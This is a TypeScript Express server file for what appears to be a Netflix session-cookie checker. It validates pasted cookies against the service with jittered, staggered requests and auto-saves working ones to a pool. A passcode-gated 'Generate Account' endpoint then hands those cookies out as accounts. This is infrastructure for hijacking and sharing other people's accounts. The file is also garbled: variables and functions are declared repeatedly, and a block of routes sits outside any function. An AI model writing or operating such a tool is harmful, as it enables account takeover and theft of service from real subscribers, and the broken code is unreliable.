import type { Express, Request, Response, NextFunction } from "express";
import { type Server } from "http";
import { storage } from "./storage";
import { registerAuthRoutes } from "./replit_integrations/auth";
import cors from "cors";
import express from "express";

import NetflixAccountChecker from "./netflix_checker.cjs";
import originalServerHelpers from "./original_server_helpers.cjs";

const tvCodes = new Map<string, any>();

function generateCode() {
  return Math.floor(10000000 + Math.random() * 90000000).toString();
}

const {
  getCookieHeaders,
  normalizeWorkerCount,
  normalizeBoolean,
  runStreamedCheck,
  runDirectCheck,
} = originalServerHelpers;

const MAX_PASSCODES = 50;
const GENERATE_ACCOUNT_DAILY_LIMIT = 3;

function getTodayDate(): string {
  return new Date().toISOString().slice(0, 10);
}

async function checkGenerateAccountLimit(
  ip: string
): Promise<{ allowed: boolean; remaining: number }> {
  const today = getTodayDate();
  const count = await storage.getGenerateUsage(ip, today);
  const remaining = GENERATE_ACCOUNT_DAILY_LIMIT - count;
  return { allowed: remaining > 0, remaining };
}

async function incrementGenerateAccountUsage(ip: string): Promise<number> {
  const today = getTodayDate();
  return storage.incrementGenerateUsage(ip, today);
}

async function autoSaveCookie(cookieHeader: string): Promise<void> {
  if (!cookieHeader || !cookieHeader.includes("=")) {
    console.warn("[auto-save] skipped — invalid cookieHeader format");
    return;
  }

  try {
    await storage.saveCookie(cookieHeader);
    const total = await storage.countCookies();
    console.log(`[auto-save] saved valid cookie to DB (total: ${total})`);
  } catch (err) {
    console.error("[auto-save] ERROR saving cookie to DB:", err);
  }
}

const VPN_CACHE_TTL_MS = 60 * 60 * 1000;
const vpnCache = new Map<string, { isVpn: boolean; cachedAt: number }>();

const PRIVATE_IP_RE =
  /^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1$|fc|fd)/;

function getClientIp(req: Request): string {
  const forwarded = req.headers["x-forwarded-for"] as string | undefined;
  return forwarded
    ? forwarded.split(",")[0].trim()
    : req.socket.remoteAddress ?? "unknown";
}

async function isVpnIp(ip: string): Promise<boolean> {
  if (!ip || ip === "unknown" || PRIVATE_IP_RE.test(ip)) return false;

  const cached = vpnCache.get(ip);
  if (cached && Date.now() - cached.cachedAt < VPN_CACHE_TTL_MS) {
    return cached.isVpn;
  }

  try {
    const res = await fetch(
      `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,proxy,hosting`
    );
    if (!res.ok) return false;

    const data = (await res.json()) as {
      status?: string;
      proxy?: boolean;
      hosting?: boolean;
    };

    const isVpn =
      data.status === "success" && (data.proxy === true || data.hosting === true);

    vpnCache.set(ip, { isVpn, cachedAt: Date.now() });
    return isVpn;
  } catch {
    return false;
  }
}

const VPN_BLOCKED_HTML = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Access Blocked</title><style>*{box-sizing:border-box;margin:0;padding:0}body{background:#141414;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}.card{text-align:center;max-width:420px}.logo{color:#e50914;font-size:56px;font-weight:900;letter-spacing:-2px;margin-bottom:24px}h1{font-size:24px;font-weight:700;margin-bottom:12px;color:#e50914}p{color:#aaa;line-height:1.6;font-size:15px}</style></head><body><div class="card"><div class="logo">N</div><h1>Access Blocked</h1><p>A VPN or proxy connection has been detected.<br>Please disable your VPN and refresh the page.</p></div></body></html>`;

const VPN_EXEMPT_PATHS = new Set([
  "/api/admin/login",
  "/api/admin/status",
  "/api/vpn-status",
]);

const VPN_EXEMPT_PREFIXES = ["/api/auth/", "/__replauthuser", "/api/login", "/api/logout"];

const tvCodes = new Map();

function generateCode() {
  return Math.floor(10000000 + Math.random() * 90000000).toString();
}



  // Generate TV code
  app.get("/api/tv-code", (req, res) => {
    const code = generateCode();

    tvCodes.set(code, {
      status: "pending",
      createdAt: Date.now()
    });

    res.json({ code });
  });

  // Submit code from phone
  app.post("/api/tv-submit", (req, res) => {
    const { code, user } = req.body;

    if (!tvCodes.has(code)) {
      return res.status(400).json({ error: "Invalid code" });
    }

    tvCodes.set(code, {
      status: "approved",
      user
    });

    res.json({ success: true });
  });

  // TV checks if approved
  app.get("/api/tv-status/:code", (req, res) => {
    const code = req.params.code;

    if (!tvCodes.has(code)) {
      return res.status(400).json({ error: "Invalid code" });
    }

    res.json(tvCodes.get(code));
  });

}

function isVpnExempt(pathname: string): boolean {
  if (VPN_EXEMPT_PATHS.has(pathname)) return true;
  return VPN_EXEMPT_PREFIXES.some((p) => pathname.startsWith(p));
}

/* ── Rate limiting ───────────────────────────────────────────── */

const globalRateLimitMap = new Map<string, { count: number; windowStart: number }>();
const routeRateLimitMap = new Map<string, { count: number; windowStart: number }>();

const GLOBAL_RATE_LIMIT_WINDOW_MS = 60_000;
const GLOBAL_RATE_LIMIT_MAX = 80;

function hitRateLimit(
  store: Map<string, { count: number; windowStart: number }>,
  key: string,
  limit: number,
  windowMs: number
): boolean {
  const now = Date.now();
  const entry = store.get(key);

  if (!entry || now - entry.windowStart > windowMs) {
    store.set(key, { count: 1, windowStart: now });
    return false;
  }

  entry.count += 1;
  return entry.count > limit;
}

function isRouteLimited(ip: string, route: string): boolean {
  if (!ip || ip === "unknown" || PRIVATE_IP_RE.test(ip)) return false;

  if (route === "/api/check") {
    return hitRateLimit(routeRateLimitMap, `${ip}:${route}`, 8, 60_000);
  }

  if (route === "/api/find-account") {
    return hitRateLimit(routeRateLimitMap, `${ip}:${route}`, 3, 60_000);
  }

  if (route === "/api/find-account/verify-passcode") {
    return hitRateLimit(routeRateLimitMap, `${ip}:${route}`, 10, 60_000);
  }

  return false;
}

function isAdmin(req: Request, res: Response, next: NextFunction) {
  if ((req.session as any)?.isAdmin === true) return next();
  res.status(401).json({ success: false, error: "Admin access required." });
}

function isFindUnlocked(req: Request, res: Response, next: NextFunction) {
  if ((req.session as any)?.findUnlocked === true) return next();
  res.status(401).json({ success: false, error: "Passcode required." });
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  registerAuthRoutes(app);

  /* ── TV PAIRING STORAGE ───────────────────────── */

const tvCodes = new Map<
  string,
  {
    status: "pending" | "approved";
    createdAt: number;
    user?: any;
  }
>();

function generateCode() {
  return Math.floor(10000000 + Math.random() * 90000000).toString();
}

// auto-clean expired codes (5 minutes)
setInterval(() => {
  const now = Date.now();
  for (const [code, data] of tvCodes.entries()) {
    if (now - data.createdAt > 5 * 60 * 1000) {
      tvCodes.delete(code);
    }
  }
}, 60_000);

  storage.pruneOldGenerateUsage(getTodayDate()).catch(() => {});

  app.use(
    cors({
      origin: true,
      credentials: true,
    })
  );

  app.use(express.json({ limit: "10mb" }));

  app.get("/api/vpn-status", async (req, res) => {
    if ((req.session as any)?.isAdmin === true) {
      res.json({ blocked: false });
      return;
    }

    const ip = getClientIp(req);
    const blocked = await isVpnIp(ip);
    res.json({ blocked });
  });

  app.use((req: Request, res: Response, next: NextFunction) => {
    if ((req.session as any)?.isAdmin === true) return next();

    const ip = getClientIp(req);
    if (!ip || ip === "unknown" || PRIVATE_IP_RE.test(ip)) return next();

    const globallyLimited = hitRateLimit(
      globalRateLimitMap,
      ip,
      GLOBAL_RATE_LIMIT_MAX,
      GLOBAL_RATE_LIMIT_WINDOW_MS
    );

    if (globallyLimited) {
      res.status(429).json({
        success: false,
        error: "Too many requests. Please slow down.",
      });
      return;
    }

    const routeLimited = isRouteLimited(ip, req.path);
    if (routeLimited) {
      res.status(429).json({
        success: false,
        error: "Too many requests for this action. Please wait a moment.",
      });
      return;
    }

    next();
  });

/* ── TV ROUTES ───────────────────────── */

// TV generates code
app.post("/api/tv/generate", (req, res) => {
  const code = generateCode();

  tvCodes.set(code, {
    status: "pending",
    createdAt: Date.now(),
  });

  res.json({ success: true, code });
});

// Phone submits code
app.post("/api/tv/connect", (req, res) => {
  const { code } = req.body;

  if (!code || !tvCodes.has(code)) {
    return res.status(400).json({ success: false, error: "Invalid code" });
  }

  const existing = tvCodes.get(code);

  tvCodes.set(code, {
    ...existing,
    status: "approved",
  });

  res.json({ success: true });
});

// TV polls status
app.get("/api/tv/status/:code", (req, res) => {
  const code = req.params.code;

  if (!tvCodes.has(code)) {
    return res.status(400).json({ success: false, error: "Invalid code" });
  }

  const data = tvCodes.get(code);

  res.json({
    status: data.status === "approved" ? "connected" : "waiting",
  });
});

  app.use(async (req: Request, res: Response, next: NextFunction) => {
    if ((req.session as any)?.isAdmin === true) return next();
    if (isVpnExempt(req.path)) return next();

    const ip = getClientIp(req);
    const blocked = await isVpnIp(ip);
    if (!blocked) return next();

    if (req.path.startsWith("/api/")) {
      res.status(403).json({
        success: false,
        error: "VPN/proxy detected. Please disable your VPN to use this service.",
      });
    } else {
      res.status(403).send(VPN_BLOCKED_HTML);
    }
  });

  app.post("/api/admin/login", async (req, res) => {
    const code = String(req.body?.code ?? "").trim();
    const stored = String(process.env.ACCESS_CODE ?? "").trim();

    if (!stored) {
      res.status(500).json({
        success: false,
        error: "ACCESS_CODE not configured on the server.",
      });
      return;
    }

    if (code === stored) {
      (req.session as any).isAdmin = true;
      req.session.save((err) => {
        if (err) {
          res.status(500).json({ success: false, error: "Session save failed." });
        } else {
          res.json({ success: true });
        }
      });
    } else {
      res.status(401).json({ success: false, error: "Incorrect admin code." });
    }
  });

  app.get("/api/admin/status", (req, res) => {
    res.json({ isAdmin: (req.session as any)?.isAdmin === true });
  });

  app.get("/api/admin/passcodes", isAdmin, async (_req, res) => {
    const list = await storage.listPasscodes();
    res.json({ passcodes: list });
  });

  app.post("/api/admin/passcodes", isAdmin, async (req, res) => {
    const code = String(req.body?.code ?? "").trim();

    if (!code) {
      res.status(400).json({ success: false, error: "Code cannot be empty." });
      return;
    }

    const count = await storage.countPasscodes();
    if (count >= MAX_PASSCODES) {
      res.status(400).json({
        success: false,
        error: `Maximum of ${MAX_PASSCODES} passcodes reached. Delete some first.`,
      });
      return;
    }

    let expiresAt: Date | null = null;
    if (req.body?.expiresAt) {
      const parsed = new Date(req.body.expiresAt);
      if (!isNaN(parsed.getTime())) {
        expiresAt = parsed;
      }
    }

    const passcode = await storage.createPasscode(code, expiresAt);
    res.json({ success: true, passcode });
  });

  app.delete("/api/admin/passcodes/:id", isAdmin, async (req, res) => {
    const id = parseInt(req.params.id, 10);
    if (isNaN(id)) {
      res.status(400).json({ success: false, error: "Invalid id." });
      return;
    }

    await storage.deletePasscode(id);
    res.json({ success: true });
  });

  app.get("/api/admin/abuse-log", isAdmin, async (_req, res) => {
    const entries = await storage.getAbuseLog();
    res.json({ entries });
  });

  app.delete("/api/admin/abuse-log", isAdmin, async (_req, res) => {
    await storage.clearAbuseLog();
    res.json({ success: true });
  });

  app.post("/api/storage/cookie", isFindUnlocked, async (req, res) => {
    const cookie = String(req.body?.cookie ?? "").trim();

    if (!cookie) {
      res.status(400).json({ success: false, error: "cookie is required." });
      return;
    }

    await storage.saveCookie(cookie);
    res.json({ success: true });
  });

  app.get("/api/admin/cookie-count", isAdmin, async (_req, res) => {
    const count = await storage.countCookies();
    res.json({ count });
  });

  app.post("/api/find-account/verify-passcode", async (req, res) => {
    const code = String(req.body?.passcode ?? "").trim();
    const count = await storage.countPasscodes();

    if (count === 0) {
      res.status(503).json({
        success: false,
        error: "No passcodes configured. Ask the admin.",
      });
      return;
    }

    const match = await storage.findValidPasscode(code);

    if (match) {
      (req.session as any).findUnlocked = true;
      req.session.save((err) => {
        if (err) {
          res.status(500).json({ success: false, error: "Session save failed." });
        } else {
          res.json({ success: true });
        }
      });
    } else {
      const allRows = await storage.listPasscodes();
      const expired = allRows.find(
        (p) => p.code === code && p.expiresAt !== null && p.expiresAt <= new Date()
      );

      if (expired) {
        res.status(401).json({ success: false, error: "This passcode has expired." });
      } else {
        res.status(401).json({ success: false, error: "Incorrect passcode." });
      }
    }
  });

  app.post("/api/find-account", isFindUnlocked, async (req, res) => {
    try {
      const admin = (req.session as any)?.isAdmin === true;

      if (!admin) {
        const ip =
          (req.headers["x-forwarded-for"] as string)?.split(",")[0].trim() ||
          req.socket.remoteAddress ||
          "unknown";

        const limitCheck = await checkGenerateAccountLimit(ip);
        const ua = String(req.headers["user-agent"] ?? "");

        if (!limitCheck.allowed) {
          await storage.appendAbuseEntry({
            ip,
            timestamp: new Date().toISOString(),
            userAgent: ua,
            allowed: false,
            dailyCount: GENERATE_ACCOUNT_DAILY_LIMIT,
          });

          res.status(429).json({
            success: false,
            error: "You have reached the 3 daily limit for Generate Account. Try again tomorrow.",
          });
          return;
        }

        const newCount = await incrementGenerateAccountUsage(ip);

        await storage.appendAbuseEntry({
          ip,
          timestamp: new Date().toISOString(),
          userAgent: ua,
          allowed: true,
          dailyCount: newCount,
        });
      }

      const storedCookies = await storage.getCookies();

      if (storedCookies.length === 0) {
        res.status(400).json({
          success: false,
          error: "Cookie pool is empty. No cookies available yet.",
        });
        return;
      }

      const parsedInput = getCookieHeaders({ input: storedCookies.join("\n") });

      if (parsedInput.error) {
        res.status(400).json({ success: false, error: parsedInput.error });
        return;
      }

      const cookies = parsedInput.cookies;
      if (!Array.isArray(cookies) || cookies.length === 0) {
        res.status(400).json({
          success: false,
          error: "No valid cookies found in the pool.",
        });
        return;
      }

      for (let i = cookies.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [cookies[i], cookies[j]] = [cookies[j], cookies[i]];
      }

      const checkOptions = {
        skipNFToken: false,
        delayMs: 350,
        randomJitter: true,
        onValidCookie: autoSaveCookie,
      };

      await runStreamedCheck(req, res, cookies, 1, checkOptions);
    } catch (error) {
      const message =
        error instanceof Error ? error.message : "Unexpected server error";
      res.status(500).json({ success: false, error: message });
    }
  });

  app.post("/api/check", async (req, res) => {
    try {
      const body = req.body || {};

      const rawInput = String(body.input ?? "");
      if (rawInput.length > 20000) {
        res.status(400).json({ success: false, error: "Input too large." });
        return;
      }

      const parsedInput = getCookieHeaders(body);
      const requestedWorkerCount = normalizeWorkerCount(body.concurrency);

      const checkOptions = {
        skipNFToken: normalizeBoolean(body.skipNFToken),
        delayMs: 1200,
        randomJitter: true,
        staggerMs: 800,
        onValidCookie: autoSaveCookie,
      };

      if (parsedInput.error) {
        res.status(400).json({ success: false, error: parsedInput.error });
        return;
      }

      const cookies = parsedInput.cookies;

      if (!Array.isArray(cookies) || cookies.length === 0) {
        res.status(400).json({
          success: false,
          error:
            "No cookies were provided. Paste Netscape rows, JSON cookie data, or raw/header cookie strings.",
        });
        return;
      }

      const workerCount = Math.max(1, Math.min(3, requestedWorkerCount));

      if (body.stream === true) {
        await runStreamedCheck(req, res, cookies, workerCount, checkOptions);
        return;
      }

      const result = await runDirectCheck(cookies, workerCount, checkOptions);
      res.json(result);
    } catch (error) {
      const message =
        error instanceof Error ? error.message : "Unexpected server error";
      res.status(500).json({ success: false, error: message });
    }
  });

  return httpServer;
}
